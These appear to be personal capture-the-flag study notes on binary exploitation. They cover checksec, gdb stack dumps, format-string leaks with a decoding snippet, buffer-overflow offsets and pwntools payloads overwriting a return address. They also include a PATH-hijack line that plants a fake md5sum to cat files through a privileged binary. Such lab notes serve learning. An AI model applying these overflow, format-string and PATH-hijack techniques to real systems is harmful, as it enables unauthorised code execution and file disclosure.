/*

ASLR 

-- useful code in vuln.py

binary exploitation -> 
    - checksec --file=vuln  |||    PIE enabled -> position independent executable 

    - readelf -s ./vuln

    - x/25gx $rsp will print the first 25 items on the stack 
    - x/gx <address> will print that 25th item is main address 

    - echo -e '#!/bin/bash\ncat "$@"\n/bin/md5sum "$@"' > md5sum
      PATH=.:$PATH ./flaghasher

    - after free(x) also pointer can point.

    - using fntstr pwning tool vuln3.py

    - exploiting format vulnerability with %p in format-string-1.py

    - payload = b"A"*i + (65).to_bytes(4, byteorder='little')
      use of to byte and we need i = 24 not 16 for alignment 
      local-target.c
      
    - vuln4.py print(%x) to print the content of the stack and use the code to 
      print the content of the stack with characters 

      # remove unwanted components
      x = x[:-1].decode()

      print(x)
      # parse to characters
      for i in x.split('-'):
          if len(i) == 8:
              a = bytearray.fromhex(i)

              for b in reversed(a):
                  if b > 32 and b < 128:
                      s += chr(b)

    - after buffer overflow take 12 bits ( buf (100 bytes):
          Occupies offsets EBP–104 through EBP–5 (that’s 100 bytes).

          Stack protector / alignment (4 bytes):
          GCC slips in a 4 byte canary (or alignment) at EBP–4.

          Saved frame pointer (4 bytes):
          Pushed by push ebp at function entry, at EBP+0.

          Saved return address (4 bytes):
          Pushed by the call vuln() in main, at EBP+4. )

    - payload += p32(win_addr)
      payload += b"B" * 4  
      or payload += p64(win_addr) works too
    
    - game-redacted.c - if (strstr(player_turn, loses[computer_turn])) 
      giving all the possible substring in player_turn 
    
*/

